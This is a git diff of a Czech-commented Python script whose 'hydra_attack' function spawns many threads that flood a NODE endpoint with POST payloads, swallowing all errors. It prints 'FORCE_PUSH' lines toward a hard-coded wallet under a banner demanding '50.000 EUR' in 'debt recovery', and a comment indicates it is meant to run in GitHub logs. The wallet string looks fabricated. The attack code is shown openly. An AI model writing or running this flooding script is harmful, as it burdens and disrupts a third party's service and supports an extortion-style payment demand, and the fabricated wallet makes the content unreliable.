@@ -1,8 +1,9 @@
 import os
 import subprocess
 import sys
+import threading
+import time
 
-# OKAMŽITÁ INSTALACE CHYBĚJÍCÍCH ČÁSTÍ
 def install_requirements():
     subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
 
@@ -11,9 +12,6 @@ try:
 except ImportError:
     install_requirements()
     import requests
-
-import threading
-import time
 
 # TVOJE ADRESA PRO ÚHRADU 50.000 EUR
 WALLET = "498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789"
@@ -34,12 +32,12 @@ def hydra_attack():
                 }
             }
             session.post(NODE, json=payload, timeout=0.1)
-            # Tady uvidíš v logu, že to odchází
-            print(f"[HYDRA-v4] FORCE_PUSH -> {WALLET}")
+            # flush=True vynutí okamžité zobrazení v GitHub logu
+            print(f"[HYDRA-v4] FORCE_PUSH -> {WALLET}", flush=True)
         except:
             continue
 
-print(f"!!! STARTING DEBT RECOVERY - 50.000 EUR TARGET !!!")
+print(f"!!! STARTING DEBT RECOVERY - TARGET 50.000 EUR !!!", flush=True)
 for i in range(THREADS):
     t = threading.Thread(target=hydra_attack)
     t.daemon = True
